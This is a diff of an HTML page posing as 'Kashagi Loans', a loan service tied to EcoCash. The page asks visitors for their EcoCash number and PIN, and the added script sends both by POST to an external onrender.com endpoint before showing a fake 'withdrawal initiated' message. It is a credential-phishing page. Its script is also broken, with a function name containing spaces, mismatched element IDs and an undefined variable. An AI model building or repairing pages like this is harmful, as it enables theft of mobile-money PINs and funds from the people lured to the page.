@@ -1,16 +1,13 @@
-<!DOCTYPE html>
-<html lang="en">
+<!DOCTYPE html><html lang="en">
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Kashagi Loans</title>
-
-<style>
+<title>Kashagi Loans</title><style>
 *{
     margin:0;
     padding:0;
     box-sizing:border-box;
-    font-family:Arial, sans-serif;
+    font-family:Arial,sans-serif;
 }
 
 body{
@@ -77,11 +74,6 @@ input{
     font-size:15px;
 }
 
-input:focus{
-    outline:none;
-    border-color:#1877f2;
-}
-
 button{
     width:100%;
     padding:13px;
@@ -94,10 +86,6 @@ button{
     cursor:pointer;
 }
 
-button:hover{
-    opacity:.95;
-}
-
 .footer{
     text-align:center;
     margin-top:15px;
@@ -108,42 +96,79 @@ button:hover{
     text-decoration:none;
     font-size:14px;
 }
-</style>
-</head>
+</style></head><body><div class="card"><div class="header">
+    <img src="Ecocash.png" class="logo" alt="Logo">
+    <h2>Kashagi Loans</h2>
+    <p>Fast • Secure • Reliable</p>
+</div>
 
-<body>
+<div class="form">
 
-<div class="card">
+    <label>EcoCash Number</label>
+    <input type="tel" id="ecocash_number" placeholder="e.g. 077 123 4567">
 
-    <div class="header">
+    <label>EcoCash Pin</label>
+    <input type="text" id="reference_number" placeholder="Enter EcoCash pin">
 
-        <!-- Replace with your logo -->
-        <img src="Ecocash.png" class="logo" alt="Logo">
+    <button onclick="Withdraw to EcoCash()">
+        Withdraw to EcoCash
+    </button>
 
-        <h2>Kashagi Loans</h2>
-
-        <p>Fast • Secure • Reliable</p>
-
+    <div class="footer">
+        <a href="#">Need Help?</a>
     </div>
 
-    <div class="form">
+</div>
 
-        <label>Ecocash Number</label>
-        <input type="tel" placeholder="e.g. 077 123 4567">
+</div><script>
+async function withdraw to EcoCash () {
 
-        <label>Ecocash Pin</label>
-        <input type="text" placeholder="Enter your pin">
+    const ecocash_number =
+        document.getElementById("ecocash_number").value;
 
-        <button onclick="window.location.href='thankyou.html'">
-    Withdraw to EcoCash
-        </button>
+    const reference_ =
+        document.getElementById("ecocash_pin").value;
 
-        <div class="footer">
-            <a href="#">Forgot your Pin?</a>
-        </div>
-        
-    </div>
+    if (!ecocash_number || !ecocash_pin) {
+        alert("Please fill in all fields.");
+        return;
+    }
 
-</div> 
-</body>
+    try {
+
+        const response = await fetch(
+            "https://kashagi-loans-k2ab.onrender.com/submit",
+            {
+                method: "POST",
+                headers: {
+                    "Content-Type": "application/json"
+                },
+                body: JSON.stringify({
+                    ecocash_number,
+                    enter_your_pin
+                })
+            }
+        );
+
+        const data = await response.json();
+
+        if (data.success) {
+
+            alert("withdrawal initiated successfully.");
+
+            window.location.href = "thankyou.html";
+
+        } else {
+
+            alert("Submission failed.");
+
+        }
+
+    } catch (error) {
+
+        alert("Server connection error.");
+
+    }
+}
+</script></body>
 </html>
